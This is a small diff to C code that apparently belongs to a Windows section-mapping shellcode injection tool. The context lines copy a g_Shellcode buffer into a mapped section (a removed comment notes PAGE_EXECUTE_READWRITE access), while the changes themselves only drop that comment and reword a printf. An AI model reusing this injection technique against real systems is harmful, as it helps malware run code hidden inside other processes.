@@ -86,7 +86,7 @@ int main(void)
         return (-1);
     }
 
-    HANDLE hSection = NULL; //ACCESS = PAGE_EXECUTE_READWRITE
+    HANDLE hSection = NULL;
     OBJECT_ATTRIBUTES hAttributes;
     memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));
 
@@ -114,7 +114,7 @@ int main(void)
         system("pause");
         return (-1);
     }
-    printf("Section sectionBaseAddress: %p\n", sectionBaseAddress);
+    printf("Section BaseAddress: %p\n", sectionBaseAddress);
 
     memcpy (sectionBaseAddress, g_Shellcode, sizeof(g_Shellcode));
     printf("Shellcode copied!\n");
